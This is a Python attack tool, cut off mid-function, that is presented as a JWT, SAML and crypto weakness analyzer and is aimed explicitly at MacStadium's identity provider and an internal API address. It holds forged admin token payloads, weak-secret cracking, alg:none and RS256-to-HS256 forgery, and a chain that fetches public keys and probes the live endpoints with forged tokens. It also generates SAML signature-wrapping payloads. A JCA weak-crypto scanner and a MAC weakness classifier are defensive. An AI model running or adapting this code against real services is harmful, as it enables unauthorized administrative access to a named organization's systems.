#!/usr/bin/env python3
"""
JWT / SAML / Crypto Weakness Analyzer
Synthesized from: Applied Cryptography (2nd+20th Ed), Cryptography Algorithms (1st+2nd Ed),
                  Pro Cryptography (.NET), Quantum-Safe Cryptography Algorithms

Attack patterns encoded:
  - HS256 empty/weak secret (MacStadium idp confirmed cracked — secret="")
  - alg:none — strip signature, set algorithm to none
  - Algorithm confusion — RS256→HS256 using public key as HMAC secret
  - SAML signature wrapping, comment injection, assertion cloning
  - Quantum-vulnerable algorithm flagging vs PQC readiness
"""

import base64
import hashlib
import hmac
import json
import re
import ssl
import struct
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False

# ── MacStadium target constants ──────────────────────────────────────────────
MACSTADIUM_IDP      = 'https://idp.macstadium.com'
MACSTADIUM_ORKA_API = 'https://10.221.188.1'

MACSTADIUM_IDP_ENDPOINTS = [
    '/oauth/token',
    '/userinfo',
    '/api/v1/',
    '/api/v1/vms',
    '/api/v1/images',
    '/api/v1/nodes',
    '/api/v1/users',
    '/.well-known/jwks.json',
    '/.well-known/openid-configuration',
]

# Forged admin payloads
MACSTADIUM_FORGE_PAYLOADS = [
    {
        'sub':        'admin',
        'email':      'admin@macstadium.com',
        'role':       'admin',
        'is_admin':   True,
        'groups':     ['admins', 'orka-admins'],
    },
    {
        'sub':        'svc-orka',
        'email':      'svc@macstadium.com',
        'orka_admin': True,
        'role':       'service',
    },
]

KNOWN_WEAK_SECRETS = [
    b'',
    b'secret',
    b'password',
    b'jwt',
    b'key',
    b'123456',
    b'admin',
    b'test',
    b'changeme',
    b'unsafe',
    b'your-256-bit-secret',
    b'jwt-secret',
    b'mysecret',
    b'supersecret',
    b'qwerty',
    b'letmein',
    b'jwttoken',
    b'hs256',
]

# Quantum-vulnerable algorithms
QUANTUM_VULNERABLE_ALGS = {
    # JWT header alg values
    'RS256', 'RS384', 'RS512',          # RSA PKCS#1.5 + SHA
    'PS256', 'PS384', 'PS512',          # RSA-PSS + SHA
    'ES256', 'ES384', 'ES512',          # ECDSA
    'RS256K',                            # ECDSA on secp256k1
    # Raw algorithm names
    'RSA', 'ECDSA', 'DSA', 'DH', 'ECDH',
    'RSA-OAEP', 'RSA-OAEP-256',
    'RSAES-PKCS1-V1_5',
}

QUANTUM_SAFE_ALGS = {
    'EdDSA',          # Ed25519 is borderline — Grover halves its security
    'SPHINCS+', 'SPHINCS-SHAKE-256', 'SPHINCS-SHA-256',
    'Kyber', 'CRYSTALS-Kyber',
    'Dilithium', 'CRYSTALS-Dilithium',
    'NTRU', 'NTRU-Prime',
    'FrodoKEM',
    'XMSS', 'LMS',   # hash-based, quantum-resistant
}

# ── JCA weak-pattern registry ─────────────────────────────────────────────────
# Source: Cryptography and Cryptanalysis in Java (Nita & Mihailescu, 2024)
#   Ch.4  — JCA engine classes: Cipher, MessageDigest, KeyPairGenerator, SecureRandom
#   Ch.8  — PRNG security: java.util.Random (LCG, non-CSPRNG) vs SecureRandom (FIPS 140-2)
#   Ch.11 — RSA best practices: min 2048-bit keys; OAEP over PKCS1v1.5
#   Ch.14 — Signature schemes: SHA1withRSA/DSA deprecated; MD5withRSA broken
#
# Each entry: pattern_name -> (regex, severity, issue_description)
# Severity: CRITICAL = exploitable now; HIGH = strong deprecation/known attack; MEDIUM = guidance

JCA_WEAK_PATTERNS = {
    # ── Symmetric ciphers ──────────────────────────────────────────────────────
    'DES_CIPHER': (
        r'Cipher\.getInstance\(\s*["\']DES["\']',
        'CRITICAL',
        'DES (56-bit key) brute-forceable in hours; NIST withdrew approval 2005',
    ),
    'TRIPLE_DES_CIPHER': (
        r'Cipher\.getInstance\(\s*["\'](?:DESede|3DES)["\']',
        'HIGH',
        '3DES deprecated NIST 2023 — SWEET32 birthday attack at ~2^32 blocks (64-bit block size)',
    ),
    'RC4_CIPHER': (
        r'Cipher\.getInstance\(\s*["\'](?:RC4|ARCFOUR)["\']',
        'CRITICAL',
        'RC4/ARCFOUR broken stream cipher — BEAST, RC4 NOMORE; prohibited by RFC 7465',
    ),
    # ── ECB mode ──────────────────────────────────────────────────────────────
    'AES_ECB_EXPLICIT': (
        r'Cipher\.getInstance\(\s*["\']AES/ECB',
        'HIGH',
        'AES/ECB mode is deterministic — identical plaintext blocks produce identical ciphertext (penguin attack)',
    ),
    'AES_NO_MODE': (
        r'Cipher\.getInstance\(\s*["\']AES["\']',
        'HIGH',
        'AES without explicit mode defaults to ECB in most JCA providers — use AES/GCM/NoPadding',
    ),
    # ── RSA padding ───────────────────────────────────────────────────────────
    'RSA_PKCS1_PADDING': (
        r'Cipher\.getInstance\(\s*["\']RSA/ECB/PKCS1Padding["\']',
        'HIGH',
        'RSA PKCS#1v1.5 padding vulnerable to Bleichenbacher chosen-ciphertext attack; use OAEP',
    ),
    # ── Weak hash functions ───────────────────────────────────────────────────
    'MD5_DIGEST': (
        r'MessageDigest\.getInstance\(\s*["\']MD5["\']',
        'HIGH',
        'MD5 cryptographically broken — collision practical since 2004 (Wang et al.)',
    ),
    'SHA1_DIGEST': (
        r'MessageDigest\.getInstance\(\s*["\']SHA-?1["\']',
        'HIGH',
        'SHA-1 deprecated — chosen-prefix collision demonstrated (SHAttered 2017); NIST deprecated 2011',
    ),
    # ── Weak PRNG ─────────────────────────────────────────────────────────────
    'MATH_RANDOM': (
        r'\bMath\.random\(\)',
        'CRITICAL',
        'Math.random() uses a non-CSPRNG (LCG variant) — output predictable; use SecureRandom for crypto',
    ),
    'JAVA_UTIL_RANDOM': (
        r'\bnew\s+(?:java\.util\.)?Random\s*\(',
        'HIGH',
        'java.util.Random uses 48-bit seed LCG — not cryptographically secure (Ch.8); use SecureRandom',
    ),
    'RANDOM_GENERATOR_DEFAULT': (
        r'RandomGenerator\.getDefault\(\)',
        'MEDIUM',
        'RandomGenerator.getDefault() is not guaranteed CSPRNG — use SecureRandom for key/nonce/session generation',
    ),
    # ── Hardcoded / zero IVs ──────────────────────────────────────────────────
    'ZERO_IV': (
        r'new\s+IvParameterSpec\s*\(\s*new\s+byte\s*\[\s*\d+\s*\]\s*\)',
        'CRITICAL',
        'All-zero IV — IV must be random and unique per encryption; fixed IV destroys semantic security',
    ),
    'HARDCODED_IV_BYTES': (
        r'IvParameterSpec\s*\(\s*new\s+byte\s*\[\s*\]\s*\{',
        'HIGH',
        'Hardcoded IV literal — IV must be randomly generated (SecureRandom) for each encryption operation',
    ),
    # ── RSA/DSA key sizes ─────────────────────────────────────────────────────
    'KEY_SIZE_512': (
        r'\.initialize\s*\(\s*512\s*[,)]',
        'CRITICAL',
        'RSA/DSA 512-bit key — factorable with commodity hardware (Ch.11: min 2048-bit recommended)',
    ),
    'KEY_SIZE_768': (
        r'\.initialize\s*\(\s*768\s*[,)]',
        'CRITICAL',
        'RSA/DSA 768-bit key — factored publicly (Kleinjung et al. 2010); use >= 2048 bits',
    ),
    'KEY_SIZE_1024': (
        r'\.initialize\s*\(\s*1024\s*[,)]',
        'HIGH',
        'RSA/DSA 1024-bit key — below NIST SP 800-131A minimum of 2048 bits (deprecated since 2013)',
    ),
    # ── Weak signature algorithms ─────────────────────────────────────────────
    'MD5_WITH_RSA_SIG': (
        r'Signature\.getInstance\(\s*["\']MD5with(?:RSA|DSA)["\']',
        'CRITICAL',
        'MD5withRSA/DSA signature — MD5 broken; use SHA256withRSA or SHA256withECDSA (Ch.14)',
    ),
    'SHA1_WITH_RSA_SIG': (
        r'Signature\.getInstance\(\s*["\']SHA1with(?:RSA|DSA|ECDSA)["\']',
        'HIGH',
        'SHA1withRSA/DSA/ECDSA signature — SHA-1 deprecated since 2011; migrate to SHA256 variant (Ch.14)',
    ),
    # ── No-op / null SecureRandom usage ──────────────────────────────────────
    'SECURE_RANDOM_SET_SEED': (
        r'SecureRandom\b[^;]*\.setSeed\s*\(',
        'HIGH',
        'SecureRandom.setSeed() reduces entropy to attacker-observable value; never seed from predictable source',
    ),
}


# ── JCA source-code weak-crypto scanner ───────────────────────────────────────

def scan_java_crypto_weaknesses(code_text: str) -> list:
    """Scan decompiled Java source or .properties text for JCA weak-crypto patterns.

    Source basis:
      Ch.4  — JCA engine classes and their getInstance() API call shapes
      Ch.8  — PRNG security: java.util.Random (LCG) not CSPRNG; SecureRandom is (FIPS 140-2)
      Ch.11 — RSA: min 2048-bit keys; OAEP padding over PKCS1v1.5 against Bleichenbacher
      Ch.14 — Signature schemes: SHA1withRSA deprecated; MD5withRSA broken

    Args:
        code_text: String containing Java source code or .properties file content.

    Returns:
        List of finding dicts, each with keys:
          severity  — 'CRITICAL' | 'HIGH' | 'MEDIUM'
          pattern   — name of the matched JCA_WEAK_PATTERNS entry
          line      — 1-based line number of the match
          issue     — human-readable description
          match     — the exact matched text (first 120 chars)
    """
    findings = []
    lines = code_text.splitlines()

    for pat_name, (pattern, severity, issue) in JCA_WEAK_PATTERNS.items():
        rx = re.compile(pattern)
        for lineno, line in enumerate(lines, start=1):
            m = rx.search(line)
            if m:
                findings.append({
                    'severity': severity,
                    'pattern':  pat_name,
                    'line':     lineno,
                    'issue':    issue,
                    'match':    m.group(0)[:120],
                })

    # Sort: CRITICAL first, then HIGH, then MEDIUM; within severity by line number
    sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2}
    findings.sort(key=lambda f: (sev_order.get(f['severity'], 9), f['line']))
    return findings


# ── Low-level JWT primitives ──────────────────────────────────────────────────

def _b64url_decode(s):
    """Base64url decode with padding fix."""
    if isinstance(s, str):
        s = s.encode()
    s = s + b'=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b):
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def _hs256_sign(msg_bytes, key_bytes):
    """HMAC-SHA256 signature."""
    return hmac.new(key_bytes, msg_bytes, hashlib.sha256).digest()


def decode_jwt(token):
    """Split JWT, decode header and payload.

    Returns: (header_dict, payload_dict, signature_bytes, parts)
    parts = [header_b64, payload_b64, sig_b64]
    """
    parts = token.strip().split('.')
    if len(parts) != 3:
        return None, None, None, None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig     = _b64url_decode(parts[2]) if parts[2] else b''
        return header, payload, sig, parts
    except Exception:
        return None, None, None, None


def forge_token(payload_dict, secret=b'', alg='HS256', extra_headers=None):
    """Build a signed JWT.

    Returns: token string
    """
    now = int(time.time())
    p = dict(payload_dict)
    if 'iat' not in p:
        p['iat'] = now
    if 'exp' not in p:
        p['exp'] = now + 3600

    header = {'alg': alg, 'typ': 'JWT'}
    if extra_headers:
        header.update(extra_headers)

    h_enc = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p_enc = _b64url_encode(json.dumps(p, separators=(',', ':')).encode())
    msg   = f'{h_enc}.{p_enc}'.encode()

    if alg == 'none':
        return f'{h_enc}.{p_enc}.'

    if alg == 'HS256':
        sig = _hs256_sign(msg, secret if isinstance(secret, bytes) else secret.encode())
        return f'{h_enc}.{p_enc}.{_b64url_encode(sig)}'

    return f'{h_enc}.{p_enc}.'  # unsupported alg → no-sig form


def test_empty_secret(token):
    """Test HS256 JWT against empty-string secret.

    Returns: (bool, payload_dict_or_None)
    """
    header, payload, sig, parts = decode_jwt(token)
    if not header or header.get('alg') != 'HS256':
        return False, None
    msg      = f'{parts[0]}.{parts[1]}'.encode()
    expected = _hs256_sign(msg, b'')
    return hmac.compare_digest(expected, sig), payload


def test_known_weak_secrets(token, extra=None):
    """Test HS256 JWT against list of known-weak secrets.

    Returns: (secret_bytes_or_None, payload_dict_or_None)
    """
    header, payload, sig, parts = decode_jwt(token)
    if not header or header.get('alg') != 'HS256':
        return None, None

    msg      = f'{parts[0]}.{parts[1]}'.encode()
    wordlist = list(KNOWN_WEAK_SECRETS)
    if extra:
        wordlist += [s.encode() if isinstance(s, str) else s for s in extra]

    for secret in wordlist:
        expected = _hs256_sign(msg, secret)
        if hmac.compare_digest(expected, sig):
            return secret, payload

    return None, None


def test_alg_none(token):
    """Build alg:none forged token from an existing JWT.

    Returns: list of forged token strings (multiple none variants)
    """
    header, payload, sig, parts = decode_jwt(token)
    if not header:
        return []

    forged = []
    for alg_val in ('none', 'None', 'NONE', 'nOnE'):
        h2       = dict(header)
        h2['alg'] = alg_val
        h_enc    = _b64url_encode(json.dumps(h2, separators=(',', ':')).encode())
        p_enc    = parts[1]
        # Three trailing formats servers may accept
        forged.append(f'{h_enc}.{p_enc}.')
        forged.append(f'{h_enc}.{p_enc}')
        forged.append(f'{h_enc}.{p_enc}.AAAA')  # garbage sig sometimes accepted

    return forged


def test_algorithm_confusion(token, public_key_pem):
    """RS256 → HS256 algorithm confusion.

    Take an RS256 JWT, re-sign it as HS256 using the PEM public key as the HMAC secret.

    Vulnerability mechanics (Applied Cryptography + Real-World Cryptography):
      Some JWT libraries infer the algorithm from the token header rather than the
      server configuration. If a server accepts HS256 tokens but normally issues RS256,
      and the library uses the stored public key bytes as the HMAC-SHA256 key when it
      sees alg=HS256, the attacker who knows the RSA public key can forge valid tokens.
      The RSA public key is almost always public (JWKS endpoint, X.509 cert, source).

    Returns: (forged_token, str) or (None, error_msg)
    """
    header, payload, sig, parts = decode_jwt(token)
    if not header:
        return None, 'Invalid JWT'

    if isinstance(public_key_pem, str):
        public_key_pem = public_key_pem.encode()

    h2          = dict(header)
    h2['alg']   = 'HS256'
    h_enc       = _b64url_encode(json.dumps(h2, separators=(',', ':')).encode())
    p_enc       = parts[1]
    msg         = f'{h_enc}.{p_enc}'.encode()
    sig_bytes   = _hs256_sign(msg, public_key_pem)
    return f'{h_enc}.{p_enc}.{_b64url_encode(sig_bytes)}', None


def fetch_jwks_public_key(issuer_url):
    """Fetch RSA public key from a JWKS endpoint.

    Tries standard JWKS paths. Returns PEM bytes of first RSA key found, or None.
    The returned bytes can be passed directly to test_algorithm_confusion() as the
    HMAC secret for an RS256→HS256 confusion attack.

    JWKS JSON structure:
      {"keys": [{"kty":"RSA","use":"sig","alg":"RS256","n":"...","e":"...","kid":"..."}]}
    n = modulus (base64url), e = exponent (base64url)
    """
    paths = [
        '/.well-known/jwks.json',
        '/jwks.json',
        '/jwks',
        '/.well-known/openid-configuration',  # follow to jwks_uri
        '/oauth2/jwks',
        '/api/auth/keys',
        '/auth/jwks',
    ]

    base = issuer_url.rstrip('/')
    for path in paths:
        url = base + path
        try:
            status, body = _http_get(url)
        except Exception:
            continue
        if status != 200 or not body:
            continue

        try:
            data = json.loads(body)
        except Exception:
            continue

        # Follow openid-configuration jwks_uri
        if 'jwks_uri' in data:
            sub_status, sub_body = _http_get(data['jwks_uri'])
            if sub_status == 200 and sub_body:
                try:
                    data = json.loads(sub_body)
                except Exception:
                    pass

        for key in data.get('keys', []):
            if key.get('kty') != 'RSA':
                continue
            if key.get('use') == 'enc':
                continue
            n_b64 = key.get('n', '')
            e_b64 = key.get('e', 'AQAB')
            if not n_b64:
                continue
            # Build DER-encoded RSAPublicKey then wrap in PEM
            pem = _jwk_to_pem(n_b64, e_b64)
            if pem:
                return pem

    return None


def _jwk_to_pem(n_b64url, e_b64url):
    """Convert JWK RSA n/e values to PEM-encoded SubjectPublicKeyInfo.

    Pure stdlib — no cryptography module required.
    ASN.1 structure: SEQUENCE { SEQUENCE { OID rsaEncryption NULL } BIT STRING DER(INTEGER n, INTEGER e) }
    """
    import base64

    def b64url_to_int(s):
        pad = 4 - len(s) % 4
        if pad != 4:
            s += '=' * pad
        b = base64.urlsafe_b64decode(s)
        return int.from_bytes(b, 'big'), b

    def der_int(i):
        b = i.to_bytes((i.bit_length() + 7) // 8, 'big')
        if b[0] & 0x80:
            b = b'\x00' + b
        return b'\x02' + _der_len(len(b)) + b

    def _der_len(n):
        if n < 0x80:
            return bytes([n])
        enc = n.to_bytes((n.bit_length() + 7) // 8, 'big')
        return bytes([0x80 | len(enc)]) + enc

    try:
        n_int, _ = b64url_to_int(n_b64url)
        e_int, _ = b64url_to_int(e_b64url)
    except Exception:
        return None

    rsa_seq = b'\x30' + _der_len(len(der_int(n_int)) + len(der_int(e_int))) + der_int(n_int) + der_int(e_int)
    oid     = b'\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00'
    bs_inner = b'\x00' + rsa_seq
    bs      = b'\x03' + _der_len(len(bs_inner)) + bs_inner
    spki    = b'\x30' + _der_len(len(oid) + len(bs)) + oid + bs

    import base64 as _b64
    pem_body = _b64.encodebytes(spki).decode()
    return f'-----BEGIN PUBLIC KEY-----\n{pem_body}-----END PUBLIC KEY-----\n'.encode()


def run_algorithm_confusion_attack(token, issuer_url=None):
    """Full RS256→HS256 algorithm confusion chain.

    Step 1: Fetch JWKS from issuer (idp.macstadium.com if not specified)
    Step 2: Extract first RSA signing key as PEM
    Step 3: Re-sign token as HS256 using RSA public key bytes as HMAC secret
    Step 4: Probe the forged token against MACSTADIUM_IDP_ENDPOINTS

    Attack mechanics (Applied Cryptography + Real-World Cryptography):
      When the verifying library reads alg from the TOKEN header (not from server config),
      and the key store maps key IDs to raw key material, a library that uses the stored
      RSA public key bytes as the HMAC-SHA256 key will accept a token signed with those
      same bytes. The RSA public key is public by definition — JWKS endpoints publish it.
      Impact: anyone who can read the JWKS endpoint can issue arbitrary tokens.

    Returns: dict with keys: pubkey_pem, forged_token, probe_results, error
    """
    target = issuer_url or MACSTADIUM_IDP

    result = {
        'issuer':       target,
        'pubkey_pem':   None,
        'forged_token': None,
        'probe_results': [],
        'error':        None,
    }

    # Step 1+2: Fetch JWKS and extract RSA public key
    pem = fetch_jwks_public_key(target)
    if pem is None:
        result['error'] = f'No RSA public key found at {target} JWKS endpoints'
        # Fall back: try to extract kid from token and look for published certs
        header, _, _, _ = decode_jwt(token)
        if header and header.get('kid'):
            result['error'] += f' (token kid={header["kid"]})'
        return result

    result['pubkey_pem'] = pem.decode() if isinstance(pem, bytes) else pem

    # Step 3: Algorithm confusion — re-sign as HS256 with RSA pubkey as secret
    forged, err = test_algorithm_confusion(token, pem)
    if err:
        result['error'] = f'Confusion forge failed: {err}'
        return result

    result['forged_token'] = forged

    # Step 4: Probe forged token against IdP
    probe = probe_idp_macstadium(forged)
    result['probe_results'] = probe

    # Summarise probe outcomes
    hits = [r for r in probe if r.get('status') not in (401, 403, None)]
    result['confirmed_bypass'] = bool(hits)
    if hits:
        result['bypass_endpoints'] = [r['endpoint'] for r in hits]

    return result


# ── HMAC weakness patterns ────────────────────────────────────────────────────

def analyze_hmac_weaknesses(mac_context):
    """Classify MAC construction weaknesses.

    mac_context: dict with keys:
      - construction: 'hmac' | 'secret_prefix' | 'secret_suffix' | 'unknown'
      - hash_alg: 'sha256' | 'sha1' | 'md5' | ...
      - output_bits: int (truncation length; None = full output)
      - key_bytes: int (key length in bytes)

    Returns: list of weakness findings.

    Technical basis (Applied Cryptography 2nd Ed, Schneier; Cryptography Algorithms):

    LENGTH EXTENSION (Merkle-Damgård padding attack):
      Applies to: secret-prefix MAC = Hash(key || message)
      Does NOT apply to: HMAC (inner+outer hash double-wrapping prevents extension)
      Mechanism: SHA-256/SHA-1/MD5 are iterated Merkle-Damgård constructions. After
        computing Hash(key||message), the internal state IS the padded-message digest.
        An attacker who knows H(key||msg) can continue the hash from that state and
        append arbitrary bytes without knowing the key. Only the padding of the original
        message (known from len(key)+len(msg)) must be included in the extension.
      Fix: Use HMAC, or H(key || H(key || message)) (though the latter has subtleties).

    BIRTHDAY ATTACK ON TRUNCATED MAC OUTPUT:
      Applies to: any MAC whose output is truncated below 2×security_level bits
      Mechanism: Two messages m1, m2 produce the same tag when MAC output space is 2^n
        bits. Expected collisions at O(2^(n/2)) queries (birthday paradox). For n=32
        bits (common in IoT/embedded), only 2^16 ≈ 65k queries needed.
      Impact: Existential forgery — forge a new message with a known-colliding tag.
      Fix: Use full MAC output (256 bits for HMAC-SHA256). Never truncate below 128 bits.

    TIMING SIDE-CHANNEL:
      Applies to: any MAC verified with a non-constant-time compare
      Mechanism: Early-exit string comparison leaks how many bytes of the MAC match,
        allowing byte-by-byte recovery of expected MAC in O(n × 256) queries.
      Fix: hmac.compare_digest() (Python), crypto/subtle.ConstantTimeCompare (Go),
        MessageDigest.isEqual (Java), CRYPTO_memcmp (C).
    """
    findings = []
    construction = mac_context.get('construction', 'unknown')
    hash_alg     = mac_context.get('hash_alg', 'unknown').lower()
    output_bits  = mac_context.get('output_bits')  # None = full
    key_bytes    = mac_context.get('key_bytes', 0)

    # ── Length extension ──────────────────────────────────────────────────────
    MD_HASHES = {'sha256', 'sha512', 'sha384', 'sha1', 'sha224', 'md5', 'md4'}
    if construction == 'secret_prefix' and hash_alg in MD_HASHES:
        findings.append({
            'type':     'LENGTH_EXTENSION_VULNERABLE',
            'severity': 'HIGH',
            'description': (
                f'secret-prefix MAC Hash({hash_alg.upper()}(key || message)) is vulnerable to '
                f'length extension — attacker can append arbitrary bytes without knowing the key'
            ),
            'mechanism': (
                'Merkle-Damgård padding: attacker knows H(key||msg), reconstructs the '
                'chained internal state, appends H(key||msg||padding||extension). '
                'Only key+message length must be known (guessable via oracle).'
            ),
            'exploit': (
                'hashpumpy / hash_extender: given H(key||msg), key_len, msg, append extension. '
                'Use for CSRF tokens, API request signing, URL integrity MACs.'
            ),
            'fix': 'Replace Hash(key||msg) with HMAC-SHA256(key, msg)',
        })
    elif construction == 'hmac':
        findings.append({
            'type':     'HMAC_LENGTH_EXTENSION_SAFE',
            'severity': 'INFO',
            'description': 'HMAC construction is immune to length extension attacks',
            'mechanism': (
                'HMAC = Hash(K⊕opad || Hash(K⊕ipad || message)) — the outer hash '
                'finalizes the internal state; there is no exposed Merkle-Damgård state to extend.'
            ),
        })

    # ── Birthday attack on truncated output ───────────────────────────────────
    if output_bits is not None:
        effective_bits = output_bits
        collision_queries = 2 ** (effective_bits // 2)
        if effective_bits < 128:
            findings.append({
                'type':     'MAC_BIRTHDAY_VULNERABLE',
                'severity': 'CRITICAL' if effective_bits <= 64 else 'HIGH',
                'description': (
                    f'MAC output truncated to {effective_bits} bits — '
                    f'birthday collision in ~{collision_queries:,} queries'
                ),
                'mechanism': (
                    f'Birthday paradox: 50% collision probability after 2^({effective_bits}//2) = '
                    f'{collision_queries:,} MAC computations. Allows existential forgery.'
                ),
                'fix': f'Use full {hash_alg.upper()} output ({_mac_full_bits(hash_alg)} bits). Never truncate below 128 bits.',
            })
        elif effective_bits < 256:
            findings.append({
                'type':     'MAC_BIRTHDAY_MARGINAL',
                'severity': 'MEDIUM',
                'description': (
                    f'MAC output is {effective_bits} bits — birthday collision requires ~{collision_queries:,} queries '
                    f'(NIST recommends >=256-bit for post-quantum margin)'
                ),
            })

    # ── Weak key ──────────────────────────────────────────────────────────────
    if 0 < key_bytes < 16:
        findings.append({
            'type':     'HMAC_SHORT_KEY',
            'severity': 'HIGH',
            'description': f'HMAC key is only {key_bytes} bytes ({key_bytes*8} bits) — brute-forceable',
            'fix':      'HMAC key must be at least 32 bytes (256 bits) for HS256',
        })
    elif key_bytes == 0:
        findings.append({
            'type':     'HMAC_EMPTY_KEY',
            'severity': 'CRITICAL',
            'description': 'HMAC key is empty (b"") — K⊕ipad = ipad = 0x36*64, K⊕opad = opad = 0x5c*64',
            'mechanism': (
                'HMAC with K=b"" is structurally valid but the effective key is the constant '
                'ipad/opad XOR mask. Any party who knows the key is empty can forge any token. '
                'MacStadium idp.macstadium.com confirmed to use empty HS256 secret (F109).'
            ),
            'exploit':   'forge_token(payload, secret=b"") — validated against live MacStadium IdP',
        })

    return findings


def _mac_full_bits(hash_alg):
    return {'sha256': 256, 'sha384': 384, 'sha512': 512, 'sha1': 160, 'md5': 128}.get(hash_alg, 256)


# ── SAML weakness detection ───────────────────────────────────────────────────

def detect_saml_xml_attacks(xml_str):
    """Scan SAML XML for signature bypass patterns.

    Returns: list of findings
    """
    findings = []
    if not xml_str:
        return findings

    xml_lower = xml_str.lower()

    # Signature wrapping (XSW): multiple Assertion nodes → cloned assertion attack
    assertion_count = xml_str.count('<saml:Assertion') + xml_str.count('<Assertion')
    if assertion_count > 1:
        findings.append({
            'type':        'SAML_SIGNATURE_WRAPPING',
            'severity':    'CRITICAL',
            'description': f'{assertion_count} Assertion nodes — XML Signature Wrapping (XSW) attack vector',
            'detail':      'Server may validate signature on first Assertion, authorize via second',
            'exploit':     'Clone signed Assertion, inject forged Assertion before or after signed one',
        })

    # Signature absent
    if '<ds:Signature' not in xml_str and '<Signature' not in xml_str:
        findings.append({
            'type':        'SAML_NO_SIGNATURE',
            'severity':    'CRITICAL',
            'description': 'SAML assertion has no ds:Signature element — unsigned assertion',
            'detail':      'Server must reject unsigned assertions; confirm it does',
            'exploit':     'Submit any crafted SAML assertion without signature to the ACS endpoint',
        })

    # Comment injection in NameID: admin<!--X-->@example.com tricks naive parsers
    if '<!--' in xml_str and ('nameid' in xml_lower or 'subject' in xml_lower):
        findings.append({
            'type':        'SAML_COMMENT_INJECTION',
            'severity':    'HIGH',
            'description': 'XML comment inside NameID or Subject field',
            'detail':      'Some parsers strip comments; NameID resolves differently in sig vs application',
            'exploit':     "Set NameID to admin<!--anything-->@domain.com — sig covers full string, app sees admin",
        })

    # NameID format: unspecified allows value substitution
    if 'format="urn:oasis:names:tc:saml:2.0:nameid-format:unspecified"' in xml_str:
        findings.append({
            'type':        'SAML_NAMEID_UNSPECIFIED',
            'severity':    'MEDIUM',
            'description': 'NameID format=unspecified — loose name matching in application',
            'detail':      'Attacker may substitute any username if application normalizes NameID',
            'exploit':     'Set NameID to admin, administrator, root, orka-admin — test which the app accepts',
        })

    # Multiple Response elements
    response_count = xml_str.count('<samlp:Response') + xml_str.count('<Response')
    if response_count > 1:
        findings.append({
            'type':        'SAML_MULTIPLE_RESPONSES',
            'severity':    'HIGH',
            'description': f'{response_count} Response elements — potential response cloning',
            'detail':      'Nested or sibling Response elements can confuse signature validation scope',
            'exploit':     'Wrap a valid Response inside a crafted outer Response',
        })

    # Attribute value injection
    if re.search(r'<saml:AttributeValue[^>]*>\s*admin', xml_str, re.I):
        findings.append({
            'type':        'SAML_ADMIN_ATTRIBUTE',
            'severity':    'INFO',
            'description': 'Admin-valued AttributeValue in assertion',
            'detail':      'Confirmed admin attribute present; check if modifiable without sig invalidation',
            'exploit':     'Modify attribute value before signature verification if XSW applicable',
        })

    return findings


def generate_xsw_variants(signed_xml):
    """Generate the 8 canonical XSW attack variants from a signed SAML assertion.

    Source: Somorovsky et al. (2012) "On Breaking SAML: Be Whoever You Want to Be"
    — the paper documented 8 distinct wrapping patterns that bypassed real-world SPs.

    Each variant places a forged/modified assertion in a different structural position
    relative to the Signature element. The SP's XML parser and signature verifier may
    disagree on which element the signature covers, allowing the attacker to control
    the authorized identity.

    Returns: list of (variant_name, description, xml_payload) tuples.
    Only produces meaningful output when the input contains a saml:Assertion.
    """
    if '<saml:Assertion' not in signed_xml and '<Assertion' not in signed_xml:
        return []

    # Extract the signed assertion block (naive — for structural testing only)
    import re

    def _replace_nameid(xml, new_id='attacker@evil.com'):
        return re.sub(
            r'(<saml:NameID[^>]*>)[^<]*(</saml:NameID>)',
            rf'\g<1>{new_id}\g<2>',
            xml,
            count=1,
        )

    def _extract_assertion(xml):
        m = re.search(r'(<saml:Assertion[\s\S]*?</saml:Assertion>)', xml)
        return m.group(1) if m else ''

    original_assertion = _extract_assertion(signed_xml)
    if not original_assertion:
        return []

    forged_assertion = _replace_nameid(original_assertion)

    variants = []

    # XSW1: Insert forged Response wrapping signed Response
    # Real sig covers inner Response; SP authorizes via outer Response attributes
    xsw1 = (
        f'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
        f'ID="_xsw1_outer" InResponseTo="_req" Version="2.0">'
        f'{forged_assertion}'
        f'{signed_xml}'
        f'</samlp:Response>'
    )
    variants.append((
        'XSW1',
        'Forged Response wraps signed Response. SP must check ID attribute of authorized Response.',
        xsw1,
    ))

    # XSW2: Signed Response followed by forged Response
    xsw2 = signed_xml + (
        f'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
        f'ID="_xsw2_forged" InResponseTo="_req" Version="2.0">'
        f'{forged_assertion}'
        f'</samlp:Response>'
    )
    variants.append((
        'XSW2',
        'Forged Response appended after signed Response. SP must not accept second Response.',
        xsw2,
    ))

    # XSW3: Forged Assertion inserted before signed Assertion (sibling)
    xsw3 = signed_xml.replace(
        original_assertion,
        forged_assertion + original_assertion,
        1,
    )
    variants.append((
        'XSW3',
        'Forged Assertion before signed Assertion. SP must validate signature covers the Assertion it acts on.',
        xsw3,
    ))

    # XSW4: Signed Assertion wrapped in Extensions, forged Assertion at top level
    xsw4 = signed_xml.replace(
        original_assertion,
        (
            f'{forged_assertion}'
            f'<samlp:Extensions>{original_assertion}</samlp:Extensions>'
        ),
        1,
    )
    variants.append((
        'XSW4',
        'Forged Assertion at document root, signed original moved into Extensions. '
        'SP must not process assertions from Extensions.',
        xsw4,
    ))

    # XSW5: Remove signature from forged assertion, place original signed inside its body
    # Forged has no sig; original has valid sig but different ID
    forged_nosig = re.sub(r'<ds:Signature[\s\S]*?</ds:Signature>', '', forged_assertion, count=1)
    xsw5 = signed_xml.replace(
        original_assertion,
        forged_nosig + original_assertion,
        1,
    )
    variants.append((
        'XSW5',
        'Unsigned forged Assertion prepended; signed original retained. '
        'SP must reject assertions without valid covering signature.',
        xsw5,
    ))

    # XSW6: Modify original inside Signature/Object block
